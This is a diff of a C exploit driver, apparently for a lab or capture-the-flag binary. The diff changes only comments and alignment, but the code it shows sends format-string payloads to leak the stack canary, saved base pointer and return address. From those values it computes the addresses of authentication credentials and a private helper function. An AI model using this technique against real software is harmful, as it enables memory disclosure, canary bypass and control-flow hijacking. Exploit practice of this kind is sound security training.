@@ -14,21 +14,21 @@ int main() {
     getchar();
     get_formatted("%*s"); // Needed to clear out the Welcome message
 
-    // The probed value on the stack is 217 for the stack canary
+    // The probed offset is 217 for the stack canary
     put_str("e %217$p\n");
     send();
     uint64_t stack_canary;
     get_formatted("%p", &stack_canary);
     fprintf(stderr, "driver: Extracted stack_canary=%lx\n", stack_canary);
 
-    // The probed value on the stack is 218 for the saved rbp value in main loop
+    // The probed offset is 218 for the saved rbp value in main loop
     put_str("e %218$p\n");
     send();
     uint64_t cur_main_bp;
     get_formatted("%p", &cur_main_bp);
     fprintf(stderr, "driver: Extracted cur_main_bp=%lx\n", cur_main_bp);
 
-    // The probed value on the stack is 219 for the return address for main_loop
+    // The probed offset is 219 for the return address for main_loop
     put_str("e %219$p\n");
     send();
     uint64_t curr_main_loop_return_addr;
@@ -37,10 +37,10 @@ int main() {
 
 
     // Compute the information for the current run using the probed values
-    uint64_t cur_auth_bp = cur_main_bp + auth_main_bp_dist;
-    uint64_t cur_auth_cred_loc = cur_auth_bp + auth_bp_cred_loc_dist;
-    uint64_t curr_auth_cred = cur_auth_bp + auth_bp_cred_dist;
-    uint64_t curr_private_helper_addr = curr_main_loop_return_addr + private_helper_distance;
+    uint64_t cur_auth_bp                = cur_main_bp + auth_main_bp_dist;
+    uint64_t cur_auth_cred_loc          = cur_auth_bp + auth_bp_cred_loc_dist;
+    uint64_t curr_auth_cred             = cur_auth_bp + auth_bp_cred_dist;
+    uint64_t curr_private_helper_addr   = curr_main_loop_return_addr + private_helper_distance;
     
 
     fprintf(stderr, "driver: Computed\ncur_auth_bp=%lx\ncur_auth_cred_loc=%lx\ncur_auth_cred=%lx\ncurr_private_helper_addr=%lx\n", 
